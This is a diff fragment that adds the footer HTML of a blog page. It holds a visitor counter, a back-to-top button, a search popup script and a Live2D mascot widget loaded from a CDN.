+</script></div><div id="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_site_uv" title="总访客量"><span><svg class="icon" aria-hidden="true"><use xlink:href="#icon-user-line"></use></svg></span><span id="busuanzi_value_site_uv"></span></span><span class="footer-separator">|</span><span id="busuanzi_container_site_pv" title="总访问量"><span><svg class="icon" aria-hidden="true"><use xlink:href="#icon-eye-line"></use></svg></span><span id="busuanzi_value_site_pv"></span></span></div></footer><a class="hty-icon-button" id="back-to-top" aria-label="back-to-top" href="#"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-arrow-up-s-line"></use></svg><svg class="progress-circle-container" viewBox="0 0 100 100"><circle class="progress-circle" id="progressCircle" cx="50" cy="50" r="48" fill="none" stroke="#6200ee" stroke-width="2" stroke-linecap="round"></circle></svg></a><a class="popup-trigger hty-icon-button icon-search" id="search" href="javascript:;" title="搜索"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-search-line"></use></svg></span></a><script>window.addEventListener("DOMContentLoaded", () => {
+  // Handle and trigger popup window
+  document.querySelector(".popup-trigger").addEventListener("click", () => {
+    document.querySelector(".popup").classList.add("show");
+    setTimeout(() => {
+      document.querySelector(".search-input").focus();
+    }, 100);
+  });
+
+  // Monitor main search box
+  const onPopupClose = () => {
+    document.querySelector(".popup").classList.remove("show");
+  };
+
+  document.querySelector(".popup-btn-close").addEventListener("click", () => {
+    onPopupClose();
+  });
+
+  window.addEventListener("keyup", event => {
+    if (event.key === "Escape") {
+      onPopupClose();
+    }
+  });
+});
+</script><script src="/js/search/local-search.js" defer></script><div class="popup search-popup"><div class="search-header"><span class="popup-btn-close close-icon hty-icon-button"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-close-line"></use></svg></span></div><div class="search-input-container"><input class="search-input" id="local-search-input" type="text" placeholder="搜索..." value=""></div><div id="local-search-result"></div></div></div><script src="https://cdn.jsdelivr.net/npm/live2d-widget@^3.1.3/lib/L2Dwidget.min.js"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"https://cdn.jsdelivr.net/npm/live2d-widget-model-wanko@1.0.5/assets/wanko.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":true},"react":{"opacity":0.7},"log":false});</script></body></html>
